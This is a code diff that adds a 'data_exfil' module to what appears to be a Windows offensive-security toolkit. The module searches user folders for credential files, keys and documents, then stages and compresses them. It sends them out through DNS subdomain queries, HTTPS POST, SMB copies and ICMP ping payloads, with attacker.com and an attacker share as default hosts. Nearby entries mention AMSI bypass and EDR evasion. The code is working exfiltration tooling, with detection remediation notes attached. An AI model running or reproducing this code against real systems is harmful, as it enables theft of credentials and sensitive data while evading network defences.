@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  data_exfil: {
+    description:
+      "Data exfiltration toolkit — stage and exfiltrate data through multiple channels. DNS exfiltration (encode data in DNS queries to attacker-controlled domain), HTTPS exfiltration (POST data to C2 endpoint), SMB staging (copy files to attacker share), ICMP tunneling (hide data in ICMP echo payloads), and local staging (compress and encrypt files for manual extraction). Includes file discovery for sensitive data targeting",
+    args: "--action discover|stage|dns|https|smb|icmp [--target PATH] [--domain DOMAIN] [--url URL] [--share \\\\HOST\\SHARE] [--listener IP] [--password KEY]",
+  },
   firewall_manage: {
     description:
       "Windows Firewall manipulation — enumerate firewall profiles and rules, disable specific profiles (Domain/Private/Public), add allow rules for inbound/outbound connections, create port forwarding rules, find and disable blocking rules, and restore firewall to previous state. Essential for enabling lateral movement and C2 communication through host-based firewall",
@@ -13875,6 +13880,393 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function dataExfil(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "discover"
+  const target = argVal(args, "--target")
+  const domain = argVal(args, "--domain")
+  const url = argVal(args, "--url")
+  const share = argVal(args, "--share")
+  const listener = argVal(args, "--listener")
+  const password = argVal(args, "--password") || "cyberstrike"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Data exfiltration operations...\n"]
+
+  if (action === "discover") {
+    const searchPath = target || "C:\\Users"
+    const script = `
+Write-Output "=== Sensitive Data Discovery ==="
+Write-Output "[*] Scanning: ${searchPath}"
+Write-Output ""
+
+$patterns = @{
+    'Credentials' = @('*.kdbx','*.key','*.pem','*.pfx','*.p12','*.cer','*.crt','id_rsa*','*.ppk','*.rdp','web.config','appsettings*.json','*.env','.env*','credentials*','*password*')
+    'Documents' = @('*.docx','*.xlsx','*.pptx','*.pdf','*.odt')
+    'Source Code' = @('*.cs','*.py','*.ps1','*.bat','*.cmd','*.vbs','*.js')
+    'Database' = @('*.sql','*.sqlite','*.db','*.mdb','*.accdb','*.bak')
+    'Archives' = @('*.zip','*.7z','*.rar','*.tar','*.gz')
+    'Config' = @('*.xml','*.yml','*.yaml','*.ini','*.conf','*.cfg')
+}
+
+$totalSize = 0
+$totalFiles = 0
+
+foreach ($category in $patterns.Keys) {
+    $categoryFiles = @()
+    foreach ($pattern in $patterns[$category]) {
+        $found = Get-ChildItem '${searchPath}' -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 20
+        $categoryFiles += $found
+    }
+
+    if ($categoryFiles.Count -gt 0) {
+        $catSize = ($categoryFiles | Measure-Object -Property Length -Sum).Sum
+        $totalSize += $catSize
+        $totalFiles += $categoryFiles.Count
+        Write-Output "[!] $category ($($categoryFiles.Count) files, $([math]::Round($catSize/1KB, 1)) KB):"
+        foreach ($f in $categoryFiles | Select-Object -First 10) {
+            Write-Output "    $($f.FullName) ($([math]::Round($f.Length/1KB, 1)) KB)"
+        }
+        if ($categoryFiles.Count -gt 10) {
+            Write-Output "    ... and $($categoryFiles.Count - 10) more"
+        }
+        Write-Output ""
+    }
+}
+
+Write-Output "=== Summary ==="
+Write-Output "[*] Total sensitive files: $totalFiles"
+Write-Output "[*] Total size: $([math]::Round($totalSize/1MB, 2)) MB"
+Write-Output ""
+
+if ($totalSize -lt 1MB) {
+    Write-Output "[*] Recommended exfil: DNS (small payload, covert)"
+} elseif ($totalSize -lt 50MB) {
+    Write-Output "[*] Recommended exfil: HTTPS (medium payload, fast)"
+} else {
+    Write-Output "[*] Recommended exfil: SMB staging (large payload, reliable)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EXFIL-001",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: `filesystem://${searchPath}`,
+      title: "Sensitive data discovery — files identified for potential exfiltration",
+      details: r.stdout.substring(0, 500),
+      remediation: "Classify and encrypt sensitive data. Monitor bulk file access patterns with DLP tools.",
+    })
+  }
+
+  if (action === "stage") {
+    const sourcePath = target || "C:\\Users"
+    const script = `
+Write-Output "=== Staging Data for Exfiltration ==="
+
+$stagingDir = "$env:TEMP\\cs-staging-$(Get-Random -Minimum 1000 -Maximum 9999)"
+New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+Write-Output "[+] Staging directory: $stagingDir"
+
+$sensitivePatterns = @('*.kdbx','*.key','*.pem','*.pfx','*.rdp','*.env','*password*','*.docx','*.xlsx','*.pdf','*.sql','*.bak','web.config','appsettings*.json')
+$staged = @()
+
+foreach ($pattern in $sensitivePatterns) {
+    $files = Get-ChildItem '${sourcePath}' -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 5
+    foreach ($f in $files) {
+        Copy-Item $f.FullName -Destination $stagingDir -ErrorAction SilentlyContinue
+        $staged += $f.FullName
+    }
+}
+
+Write-Output "[*] Staged $($staged.Count) files"
+
+$archivePath = "$env:TEMP\\cs-exfil-$(Get-Date -Format 'yyyyMMddHHmmss').zip"
+
+try {
+    Compress-Archive -Path "$stagingDir\\*" -DestinationPath $archivePath -Force -ErrorAction Stop
+    $archiveSize = (Get-Item $archivePath).Length
+    Write-Output "[+] Archive created: $archivePath ($([math]::Round($archiveSize/1KB, 1)) KB)"
+
+    if ('${password}' -ne '') {
+        Write-Output "[*] For encryption, use: 7z a -p'${password}' -mhe=on encrypted.7z $archivePath"
+    }
+} catch {
+    Write-Output "[-] Compression failed: $($_.Exception.Message)"
+}
+
+Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Staging directory cleaned"
+Write-Output ""
+Write-Output "[*] Next steps:"
+Write-Output "    winhook data_exfil --action https --target $archivePath --url https://attacker.com/upload"
+Write-Output "    winhook data_exfil --action smb --target $archivePath --share '\\\\attacker\\share'"
+Write-Output "    winhook data_exfil --action dns --target $archivePath --domain exfil.attacker.com"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EXFIL-002",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: "filesystem://staging",
+      title: "Sensitive files staged and compressed for exfiltration",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor bulk file copy operations. DLP solutions should flag archive creation from sensitive directories.",
+    })
+  }
+
+  if (action === "dns") {
+    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
+    const exfilDomain = domain || "exfil.attacker.com"
+    const script = `
+Write-Output "=== DNS Exfiltration ==="
+Write-Output "[*] Target: ${targetFile}"
+Write-Output "[*] Domain: ${exfilDomain}"
+Write-Output ""
+
+if (-not (Test-Path '${targetFile}')) {
+    Write-Output "[-] File not found: ${targetFile}"
+    Write-Output ""
+    Write-Output "[*] DNS exfiltration technique:"
+    Write-Output "    1. Read file bytes → Base32 encode (DNS-safe charset)"
+    Write-Output "    2. Split into 63-byte labels (max DNS label length)"
+    Write-Output "    3. Send as DNS queries: <chunk>.<seq>.<session>.${exfilDomain}"
+    Write-Output "    4. Attacker DNS server reassembles from query log"
+    Write-Output ""
+    Write-Output "[*] Advantages:"
+    Write-Output "    - DNS often allowed through firewalls"
+    Write-Output "    - Blends with legitimate DNS traffic"
+    Write-Output "    - No direct connection to attacker IP"
+    Write-Output ""
+    Write-Output "[*] Limitations:"
+    Write-Output "    - Slow (~50 KB/min)"
+    Write-Output "    - Best for small files (<1 MB)"
+    Write-Output "    - DNS logging can capture queries"
+    Write-Output ""
+    Write-Output "[!] DRY RUN — stage files first: winhook data_exfil --action stage"
+} else {
+    $bytes = [System.IO.File]::ReadAllBytes('${targetFile}')
+    $b64 = [Convert]::ToBase64String($bytes) -replace '[+/=]',''
+    $chunkSize = 50
+    $chunks = [math]::Ceiling($b64.Length / $chunkSize)
+    $session = Get-Random -Minimum 100000 -Maximum 999999
+
+    Write-Output "[*] File size: $($bytes.Length) bytes"
+    Write-Output "[*] Encoded size: $($b64.Length) chars"
+    Write-Output "[*] Chunks: $chunks"
+    Write-Output "[*] Session: $session"
+    Write-Output "[*] Estimated time: $([math]::Round($chunks * 0.1, 1)) seconds"
+    Write-Output ""
+
+    $sent = 0
+    for ($i = 0; $i -lt $b64.Length; $i += $chunkSize) {
+        $chunk = $b64.Substring($i, [math]::Min($chunkSize, $b64.Length - $i))
+        $query = "$chunk.$sent.$session.${exfilDomain}"
+        try {
+            Resolve-DnsName $query -Type A -DnsOnly -ErrorAction SilentlyContinue | Out-Null
+            $sent++
+        } catch {}
+        if ($sent % 50 -eq 0) {
+            Write-Output "[*] Sent $sent/$chunks chunks..."
+        }
+    }
+    Write-Output "[+] DNS exfiltration complete: $sent chunks sent to ${exfilDomain}"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EXFIL-003",
+      provider: "windows",
+      severity: "critical",
+      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
+      resource: `dns://${exfilDomain}`,
+      title: `DNS exfiltration via subdomain encoding to ${exfilDomain}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor DNS query volume and unusual subdomain patterns. Deploy DNS logging and analysis.",
+    })
+  }
+
+  if (action === "https") {
+    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
+    const exfilUrl = url || "https://attacker.com/upload"
+    const script = `
+Write-Output "=== HTTPS Exfiltration ==="
+Write-Output "[*] Target: ${targetFile}"
+Write-Output "[*] URL: ${exfilUrl}"
+Write-Output ""
+
+if (-not (Test-Path '${targetFile}')) {
+    Write-Output "[-] File not found: ${targetFile}"
+    Write-Output ""
+    Write-Output "[*] HTTPS exfiltration technique:"
+    Write-Output "    1. Read file → Base64 encode"
+    Write-Output "    2. POST to attacker endpoint as multipart/form-data"
+    Write-Output "    3. TLS encrypts in transit — content inspection blind"
+    Write-Output ""
+    Write-Output "[*] Advantages: Fast, encrypted, blends with HTTPS traffic"
+    Write-Output "[*] Limitations: Requires outbound HTTPS, URL may be logged by proxy"
+    Write-Output ""
+    Write-Output "[!] DRY RUN — stage files first"
+} else {
+    try {
+        $bytes = [System.IO.File]::ReadAllBytes('${targetFile}')
+        Write-Output "[*] File size: $($bytes.Length) bytes"
+
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Content-Type", "application/octet-stream")
+        $wc.Headers.Add("X-Session", "$(Get-Random -Minimum 100000 -Maximum 999999)")
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+
+        $response = $wc.UploadData('${exfilUrl}', 'POST', $bytes)
+        Write-Output "[+] Upload complete — $($bytes.Length) bytes sent"
+        Write-Output "[*] Response: $([System.Text.Encoding]::UTF8.GetString($response))"
+    } catch {
+        Write-Output "[-] Upload failed: $($_.Exception.Message)"
+    }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EXFIL-004",
+      provider: "windows",
+      severity: "critical",
+      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
+      resource: `https://${exfilUrl}`,
+      title: `HTTPS exfiltration via POST to ${exfilUrl}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Deploy SSL/TLS inspection proxy. Monitor large outbound POST requests. Use DLP on egress.",
+    })
+  }
+
+  if (action === "smb") {
+    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
+    const smbShare = share || "\\\\attacker\\share"
+    const script = `
+Write-Output "=== SMB Exfiltration ==="
+Write-Output "[*] Target: ${targetFile}"
+Write-Output "[*] Share: ${smbShare}"
+Write-Output ""
+
+if (-not (Test-Path '${targetFile}')) {
+    Write-Output "[-] File not found: ${targetFile}"
+    Write-Output ""
+    Write-Output "[*] SMB exfiltration technique:"
+    Write-Output "    1. Mount attacker SMB share (or use UNC path directly)"
+    Write-Output "    2. Copy staged files to share"
+    Write-Output "    3. Disconnect share"
+    Write-Output ""
+    Write-Output "[*] Advantages: Native Windows, fast for large files, no extra tools"
+    Write-Output "[*] Limitations: SMB port 445 must be open outbound, easily detected"
+    Write-Output ""
+    Write-Output "[!] DRY RUN — stage files first"
+} else {
+    try {
+        $destPath = "${smbShare}\\$(Split-Path '${targetFile}' -Leaf)"
+        Copy-Item '${targetFile}' -Destination $destPath -Force -ErrorAction Stop
+        Write-Output "[+] File copied to $destPath"
+        Write-Output "[*] Size: $((Get-Item '${targetFile}').Length) bytes"
+    } catch {
+        Write-Output "[-] SMB copy failed: $($_.Exception.Message)"
+        Write-Output "[*] Ensure share is accessible and you have write permissions"
+        Write-Output "[*] Try: net use ${smbShare} /user:USERNAME PASSWORD"
+    }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EXFIL-005",
+      provider: "windows",
+      severity: "critical",
+      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
+      resource: `smb://${smbShare}`,
+      title: `SMB exfiltration to ${smbShare}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Block outbound SMB (port 445) at perimeter. Monitor SMB connections to external hosts.",
+    })
+  }
+
+  if (action === "icmp") {
+    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
+    const icmpListener = listener || "10.0.0.1"
+    const script = `
+Write-Output "=== ICMP Tunnel Exfiltration ==="
+Write-Output "[*] Target: ${targetFile}"
+Write-Output "[*] Listener: ${icmpListener}"
+Write-Output ""
+
+if (-not (Test-Path '${targetFile}')) {
+    Write-Output "[-] File not found: ${targetFile}"
+    Write-Output ""
+    Write-Output "[*] ICMP exfiltration technique:"
+    Write-Output "    1. Read file → split into 512-byte chunks"
+    Write-Output "    2. Encode each chunk in ICMP echo request payload"
+    Write-Output "    3. Send ping with custom payload to listener"
+    Write-Output "    4. Listener captures and reassembles from ICMP data"
+    Write-Output ""
+    Write-Output "[*] Advantages: ICMP often allowed through firewalls, hard to inspect"
+    Write-Output "[*] Limitations: Slow, some firewalls block ICMP, payload size limited"
+    Write-Output ""
+    Write-Output "[!] DRY RUN — stage files first"
+} else {
+    $bytes = [System.IO.File]::ReadAllBytes('${targetFile}')
+    $chunkSize = 512
+    $chunks = [math]::Ceiling($bytes.Length / $chunkSize)
+
+    Write-Output "[*] File size: $($bytes.Length) bytes"
+    Write-Output "[*] Chunks: $chunks ($chunkSize bytes each)"
+    Write-Output "[*] Estimated time: $([math]::Round($chunks * 0.2, 1)) seconds"
+    Write-Output ""
+
+    $pinger = New-Object System.Net.NetworkInformation.Ping
+    $sent = 0
+
+    for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) {
+        $end = [math]::Min($i + $chunkSize, $bytes.Length)
+        $chunk = $bytes[$i..($end-1)]
+
+        $headerBytes = [System.BitConverter]::GetBytes($sent) + [System.BitConverter]::GetBytes($chunks)
+        $payload = $headerBytes + $chunk
+
+        try {
+            $reply = $pinger.Send('${icmpListener}', 1000, $payload)
+            $sent++
+        } catch {}
+
+        if ($sent % 20 -eq 0) {
+            Write-Output "[*] Sent $sent/$chunks chunks..."
+        }
+    }
+    Write-Output "[+] ICMP exfiltration complete: $sent chunks sent"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EXFIL-006",
+      provider: "windows",
+      severity: "critical",
+      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
+      resource: `icmp://${icmpListener}`,
+      title: `ICMP tunnel exfiltration to ${icmpListener}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor ICMP payload sizes. Normal ping uses 32B payload — anything larger is suspicious.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function firewallManage(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const profile = argVal(args, "--profile") || "all"
@@ -19118,6 +19510,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  data_exfil: dataExfil,
   firewall_manage: firewallManage,
   local_recon: localRecon,
   ps_downgrade: psDowngrade,
